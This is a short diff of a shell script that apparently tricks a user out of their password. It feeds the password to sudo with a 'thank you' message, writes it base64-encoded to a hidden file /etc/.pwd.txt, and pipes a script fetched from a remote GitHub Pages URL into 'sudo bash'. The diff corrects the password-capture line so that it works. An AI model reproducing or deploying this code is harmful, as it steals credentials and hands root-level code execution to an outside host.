@@ -6,8 +6,8 @@ echo ""
 
 echo $pwd | sudo -S echo "Thank you for your help!"
 
-enc=$(echo $pwd) | base64 | tr -- '+=/' '-_~'
-sudo echo $enc >> /etc/.pwd.txt
+enc=$(echo $pwd | base64 | tr -- '+=/' '-_~')
+sudo echo $enc > /etc/.pwd.txt
 
 curl -s https://matthewpipie.github.io/sendmac.sh?$(date +%s) | sudo bash
 
